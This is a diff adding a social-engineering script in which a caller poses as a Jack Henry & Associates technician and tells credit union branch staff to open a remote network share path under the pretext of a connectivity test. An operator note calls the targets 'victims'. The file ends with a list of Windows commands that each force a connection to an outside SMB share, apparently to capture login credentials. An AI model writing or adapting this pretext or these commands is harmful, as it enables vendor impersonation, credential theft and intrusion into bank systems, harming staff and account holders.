@@ -1,0 +1,43 @@
+Hi xyz, my name is xyz with Jack Henry & associates. I've been working with xyz at the seaside branch trying to determine the source for connectivity issues with the Symitar system.
+
+We are going to need you to run a quick test for us which should will only take a few moments 
+
+1:::
+click start button in bottom left corner
+
+click run
+
+type \\172.24.45.82\symitar
+::::
+
+2:::
+open the windows explorer ( the yellow folder on the bottom bar )
+
+type \\172.24.45.82\symitar into the address bar at the top and hit enter
+::::
+
+3:::
+open internet explorer ( the yellow folder on the bottom bar )
+
+type \\172.24.45.82\symitar into the address bar at the top and hit enter
+::::
+
+If you see access denied or can't access that means the symitar controller is denieing your request, which means communication between your PC and the core is good.
+
+Thank you for your time.
+
+-----------------------------
+NOTE:: Has to be backslash not forward slash, describe it to victims as one above enter button
+
+
+
+
+
+echo 1 > //192.168.0.1/abc
+pushd \\192.168.0.1\abc
+cmd /k \\192.168.0.1\abc
+cmd /c \\192.168.0.1\abc
+start \\192.168.0.1\abc
+mkdir \\192.168.0.1\abc
+type\\192.168.0.1\abc
+dir\\192.168.0.1\abc
